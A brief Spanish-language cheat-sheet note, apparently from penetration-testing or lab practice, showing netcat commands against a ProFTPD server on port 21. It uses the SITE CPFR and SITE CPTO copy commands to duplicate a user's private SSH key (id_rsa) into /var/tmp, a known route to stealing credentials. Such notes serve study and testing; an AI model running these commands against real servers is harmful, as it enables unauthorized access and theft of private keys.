# Comandos Netcat 

Tags: #Netcat #ProFTPD

## ProFTPD

```bash 
❯ nc <IP> 21                                        # Nos conectamos al server ProFTPD con Netcat 
	❯ SITE CPFR /home/kali/.ssh/id_rsa             # Copiamos el 'id_rsa' en la ruta donde se encuentra 'CPFR = Copy From'
	❯ SITE CPTO /var/tmp/id_rsa                    # Depositamos la 'id_rsa' en ese dir 'CPTO = Copy To'
```